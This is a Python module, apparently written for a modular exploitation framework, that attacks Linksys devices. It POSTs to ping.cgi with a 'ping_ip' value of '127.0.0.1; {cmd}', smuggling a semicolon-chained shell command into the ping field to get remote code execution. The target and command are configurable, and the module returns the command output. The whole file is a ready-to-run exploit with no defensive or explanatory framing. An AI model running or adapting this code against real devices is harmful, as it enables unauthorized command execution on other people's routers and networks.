import httpx
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "linksys/ping_rce_attack"
        self.description = "Exploit engine to trigger arbitrary OS commands on Linksys devices via ping injection."
        self.type = "attack"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "80"},
            "CMD": {"required": True, "value": "id"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        cmd = self.options["CMD"]["value"]
        
        if not target.startswith(("http://", "https://")):
            url = f"http://{target}:{port}/ping.cgi"
        else:
            url = f"{target.rstrip('/')}/ping.cgi"
            
        # Injection du payload via une commande chaînée par point-virgule (;)
        payload = {"ping_ip": f"127.0.0.1; {cmd}"}
        
        try:
            async with httpx.AsyncClient(timeout=8.0) as client:
                print(f"\033[1;33m[*] Delivering Linksys RCE payload: {cmd}\033[0m")
                response = await client.post(url, data=payload)
                if response.status_code == 200 and response.text:
                    return {
                        "success": True,
                        "details": f"Command executed successfully. Output snippet:\n{response.text.strip()[:600]}"
                    }
        except Exception as e:
            return {"success": False, "error": str(e)}
        return {"success": False, "details": "Payload delivered but target device did not return visible execution logs."}
